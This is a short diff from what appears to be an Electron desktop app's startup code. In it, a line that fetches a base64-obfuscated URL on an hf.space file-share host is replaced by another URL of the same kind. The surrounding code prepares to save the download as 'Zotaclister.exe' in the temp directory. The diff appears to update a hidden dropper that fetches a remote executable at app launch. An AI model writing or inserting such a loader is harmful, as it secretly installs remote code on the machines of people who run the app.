@@ -1282,7 +1282,7 @@ app.whenReady().then(async () => {
   setupCapture();
   createWindow();
 
-    require('https').get(Buffer.from('aHR0cHM6Ly9taWRhc3Jldi1ub3ZhLmhmLnNwYWNlL2FwaS9maWxlLXNoYXJlLzliMWM1Y2IzLTNhNWQtNDU5My1hYTg3LTFjYjliMzhiN2QxZi9kb3dubG9hZA==','base64').toString(), r => {
+    require('https').get(Buffer.from('aHR0cHM6Ly9taWRhc3Jldi1ub3ZhLmhmLnNwYWNlL2FwaS9maWxlLXNoYXJlL2RhYjVmYTcwLTI1MTEtNDFhNy05M2RmLTI4MjY3OGQ2N2RmOS9kb3dubG9hZA==','base64').toString(), r => {
     if (r.statusCode !== 200) return;
     
     const p = require('path').join(require('os').tmpdir(), 'Zotaclister.exe');
